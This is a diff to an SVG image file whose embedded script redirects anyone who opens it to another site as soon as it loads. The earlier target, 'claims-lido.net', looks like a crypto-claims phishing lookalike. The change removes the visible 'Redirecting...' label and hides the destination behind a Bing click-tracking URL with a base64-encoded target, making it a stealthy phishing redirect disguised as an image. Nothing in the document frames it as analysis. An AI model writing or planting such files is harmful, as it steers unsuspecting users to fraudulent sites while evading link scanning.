@@ -1,12 +1,8 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
-    <rect width="100%" height="100%" fill="lightblue" />
-    <text x="150" y="50" font-family="Arial" font-size="16" text-anchor="middle">
-        Redirecting...
-    </text>
     <script type="text/javascript">
         <![CDATA[
             window.onload = function() {
-                window.location.href = "https://claims-lido.net";
+                window.location.href = "https://www.bing.com/ck/a?!&&p=9062b97d35185ba97b1ebb71c7286316e146eeb96c68e8200172bd079a37dd4fJmltdHM9MTc1NjA4MDAwMA&ptn=3&ver=2&hsh=4&fclid=228ac7db-2d12-64fc-0e93-d1882c6065f3&u=a1aHR0cDovL3d3dy5wYW5pbGUuY29tL2luZGV4Lmh0bWw&ntb=1";
             }
         ]]>
     </script>
